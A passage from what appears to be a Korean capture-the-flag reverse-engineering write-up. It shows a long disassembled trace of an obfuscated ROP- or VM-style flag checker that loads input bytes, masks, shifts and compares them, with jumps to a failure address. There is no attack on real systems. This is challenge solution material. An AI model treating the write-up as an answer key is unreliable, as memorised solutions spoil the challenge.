</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34785100</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">93966797857408</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34785110</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">QWORD</span>)(<span style="color:#a6e22e">buf_5576599b6280</span>)
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34785118</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rsi</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">65535</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34785128</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">eax</span> <span style="color:#f92672">&amp;=</span> <span style="color:#a6e22e">esi</span> <span style="color:#75715e">// eax &amp;= 65535
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0x34785130</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">-=</span> <span style="color:#a6e22e">rdi</span> <span style="color:#75715e">// rax -= 2609
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0x34785138</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">880300432</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34785148</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rdx</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">880300944</span> ; <span style="color:#a6e22e">r12</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34785160</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">if</span> <span style="color:#66d9ef">true</span> <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x34785390</span> <span style="color:#66d9ef">else</span> <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x34785190</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34785168</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rdx</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> ; <span style="color:#a6e22e">r12</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">4294967295</span>
</span></span></code></pre></div><p>이런식으로 결과가 출력된다.</p>
<h2 id="rev-sol">Rev sol<a hidden class="anchor" aria-hidden="true" href="#rev-sol">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span><span style="color:#ae81ff">0x34788db8</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rdx</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">880315912</span> ; <span style="color:#a6e22e">r12</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34788dd0</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">if</span> <span style="color:#66d9ef">true</span> <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x34788e08</span> <span style="color:#66d9ef">else</span> <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x3478a218</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34788dd8</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rdx</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> ; <span style="color:#a6e22e">r12</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">4294967295</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34788df0</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rdx</span> <span style="color:#f92672">|=</span> <span style="color:#a6e22e">rax</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34788df8</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rsp</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">rdx</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34788e00</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">invalid</span> <span style="color:#a6e22e">ops</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34788e08</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">93966797857408</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34788e18</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rbx</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">41</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34788e28</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">rbx</span> ; <span style="color:#a6e22e">rbx</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">93966797857408</span> ; <span style="color:#a6e22e">rbp</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> ; <span style="color:#a6e22e">r12</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> ; <span style="color:#a6e22e">r13</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">4294967295</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34788e50</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#a6e22e">QWORD</span> <span style="color:#f92672">*</span>)(<span style="color:#a6e22e">rax</span>) <span style="color:#75715e">// *(QWORD *)0x5576599b62a9
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0x34788e58</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rsi</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">255</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34788e68</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">eax</span> <span style="color:#f92672">&amp;=</span> <span style="color:#a6e22e">esi</span> <span style="color:#75715e">// eax &amp;= 255
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0x34788e70</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rdi</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">414588904</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34788e80</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">xchg</span> <span style="color:#a6e22e">edi</span>, <span style="color:#a6e22e">eax</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34788e88</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">&gt;&gt;=</span> <span style="color:#ae81ff">6</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34788e90</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rsi</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">255</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34788ea0</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">&gt;&gt;=</span> <span style="color:#ae81ff">6</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34788ea8</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">eax</span> <span style="color:#f92672">&amp;=</span> <span style="color:#a6e22e">esi</span> <span style="color:#75715e">// eax &amp;= 255
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0x34788eb0</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">xchg</span> <span style="color:#a6e22e">edi</span>, <span style="color:#a6e22e">eax</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34788eb8</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">-=</span> <span style="color:#a6e22e">rdi</span> <span style="color:#75715e">// rax -= 414588904
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0x34788ec0</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">880321048</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34788ed0</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rdx</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">880316192</span> ; <span style="color:#a6e22e">r12</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34788ee8</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">if</span> <span style="color:#66d9ef">true</span> <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x34788f20</span> <span style="color:#66d9ef">else</span> <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x3478a218</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34788ef0</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rdx</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> ; <span style="color:#a6e22e">r12</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">4294967295</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34788f08</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rdx</span> <span style="color:#f92672">|=</span> <span style="color:#a6e22e">rax</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34788f10</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rsp</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">rdx</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34788f18</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">invalid</span> <span style="color:#a6e22e">ops</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34788f20</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">93966797857408</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34788f30</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rbx</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">42</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34788f40</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">rbx</span> ; <span style="color:#a6e22e">rbx</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">93966797857408</span> ; <span style="color:#a6e22e">rbp</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> ; <span style="color:#a6e22e">r12</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> ; <span style="color:#a6e22e">r13</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">4294967295</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34788f68</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#a6e22e">QWORD</span> <span style="color:#f92672">*</span>)(<span style="color:#a6e22e">rax</span>) <span style="color:#75715e">// *(QWORD *)0x5576599b62aa
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0x34788f70</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rsi</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">255</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34788f80</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">eax</span> <span style="color:#f92672">&amp;=</span> <span style="color:#a6e22e">esi</span> <span style="color:#75715e">// eax &amp;= 255
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0x34788f88</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">eax</span> <span style="color:#f92672">*=</span> <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34788f90</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">eax</span> <span style="color:#f92672">*=</span> <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34788f98</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rdi</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">392</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34788fa8</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">-=</span> <span style="color:#a6e22e">rdi</span> <span style="color:#75715e">// rax -= 392
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0x34788fb0</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">880321048</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34788fc0</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rdx</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">880316432</span> ; <span style="color:#a6e22e">r12</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34788fd8</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">if</span> <span style="color:#66d9ef">true</span> <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x34789010</span> <span style="color:#66d9ef">else</span> <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x3478a218</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34788fe0</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rdx</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> ; <span style="color:#a6e22e">r12</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">4294967295</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34788ff8</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rdx</span> <span style="color:#f92672">|=</span> <span style="color:#a6e22e">rax</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34789000</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rsp</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">rdx</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34789008</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">invalid</span> <span style="color:#a6e22e">ops</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34789010</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">93966797857408</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34789020</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rbx</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">43</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34789030</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">rbx</span> ; <span style="color:#a6e22e">rbx</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">93966797857408</span> ; <span style="color:#a6e22e">rbp</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> ; <span style="color:#a6e22e">r12</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> ; <span style="color:#a6e22e">r13</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">4294967295</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34789058</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#a6e22e">QWORD</span> <span style="color:#f92672">*</span>)(<span style="color:#a6e22e">rax</span>) <span style="color:#75715e">// *(QWORD *)0x5576599b62ab
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0x34789060</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rsi</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">255</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34789070</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">eax</span> <span style="color:#f92672">&amp;=</span> <span style="color:#a6e22e">esi</span> <span style="color:#75715e">// eax &amp;= 255
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0x34789078</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rdi</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">912316478</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34789088</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">xchg</span> <span style="color:#a6e22e">edi</span>, <span style="color:#a6e22e">eax</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34789090</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rsi</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">4286578688</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x347890a0</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">eax</span> <span style="color:#f92672">&amp;=</span> <span style="color:#a6e22e">esi</span> <span style="color:#75715e">// eax &amp;= 4286578688
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0x347890a8</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">xchg</span> <span style="color:#a6e22e">edi</span>, <span style="color:#a6e22e">eax</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x347890b0</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">eax</span> <span style="color:#f92672">&lt;&lt;=</span> <span style="color:#ae81ff">0x17</span> ; <span style="color:#a6e22e">ecx</span> <span style="color:#f92672">|=</span> <span style="color:#a6e22e">eax</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x347890b8</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">-=</span> <span style="color:#a6e22e">rdi</span> <span style="color:#75715e">// rax -= 912316478
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0x347890c0</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">880321048</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x347890d0</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rdx</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">880316704</span> ; <span style="color:#a6e22e">r12</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x347890e8</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">if</span> <span style="color:#66d9ef">true</span> <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x34789120</span> <span style="color:#66d9ef">else</span> <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x3478a218</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x347890f0</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rdx</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> ; <span style="color:#a6e22e">r12</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">4294967295</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34789108</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rdx</span> <span style="color:#f92672">|=</span> <span style="color:#a6e22e">rax</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34789110</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rsp</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">rdx</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34789118</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">invalid</span> <span style="color:#a6e22e">ops</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34789120</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">93966797857408</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34789130</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rbx</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">44</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34789140</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">rbx</span> ; <span style="color:#a6e22e">rbx</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">93966797857408</span> ; <span style="color:#a6e22e">rbp</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> ; <span style="color:#a6e22e">r12</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> ; <span style="color:#a6e22e">r13</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">4294967295</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34789168</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#a6e22e">QWORD</span> <span style="color:#f92672">*</span>)(<span style="color:#a6e22e">rax</span>) <span style="color:#75715e">// *(QWORD *)0x5576599b62ac
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0x34789170</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rsi</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">255</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34789180</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">eax</span> <span style="color:#f92672">&amp;=</span> <span style="color:#a6e22e">esi</span> <span style="color:#75715e">// eax &amp;= 255
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0x34789188</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rdi</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1699151259</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34789198</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">xchg</span> <span style="color:#a6e22e">edi</span>, <span style="color:#a6e22e">eax</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x347891a0</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">&gt;&gt;=</span> <span style="color:#ae81ff">6</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x347891a8</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rsi</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">255</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x347891b8</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">&gt;&gt;=</span> <span style="color:#ae81ff">6</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x347891c0</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">eax</span> <span style="color:#f92672">&amp;=</span> <span style="color:#a6e22e">esi</span> <span style="color:#75715e">// eax &amp;= 255
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0x347891c8</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">xchg</span> <span style="color:#a6e22e">edi</span>, <span style="color:#a6e22e">eax</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x347891d0</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">-=</span> <span style="color:#a6e22e">rdi</span> <span style="color:#75715e">// rax -= 1699151259
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0x347891d8</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">880321048</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x347891e8</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rdx</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">880316984</span> ; <span style="color:#a6e22e">r12</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34789200</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">if</span> <span style="color:#66d9ef">true</span> <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x34789238</span> <span style="color:#66d9ef">else</span> <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x3478a218</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34789208</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rdx</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> ; <span style="color:#a6e22e">r12</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">4294967295</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34789220</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rdx</span> <span style="color:#f92672">|=</span> <span style="color:#a6e22e">rax</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34789228</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rsp</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">rdx</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34789230</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">invalid</span> <span style="color:#a6e22e">ops</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34789238</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">93966797857408</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34789248</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rbx</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">45</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34789258</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">rbx</span> ; <span style="color:#a6e22e">rbx</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">93966797857408</span> ; <span style="color:#a6e22e">rbp</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> ; <span style="color:#a6e22e">r12</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> ; <span style="color:#a6e22e">r13</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">4294967295</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34789280</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#a6e22e">QWORD</span> <span style="color:#f92672">*</span>)(<span style="color:#a6e22e">rax</span>) <span style="color:#75715e">// *(QWORD *)0x5576599b62ad
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0x34789288</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rsi</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">255</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x34789298</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">eax</span> <span style="color:#f92672">&amp;=</span> <span style="color:#a6e22e">esi</span> <span style="color:#75715e">// eax &amp;= 255
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0x347892a0</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">eax</span> <span style="color:#f92672">*=</span> <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x347892a8</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">eax</span> <span style="color:#f92672">*=</span> <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x347892b0</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rdi</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">500</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x347892c0</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">-=</span> <span style="color:#a6e22e">rdi</span> <span style="color:#75715e">// rax -= 500
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0x347892c8</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">880321048</span>
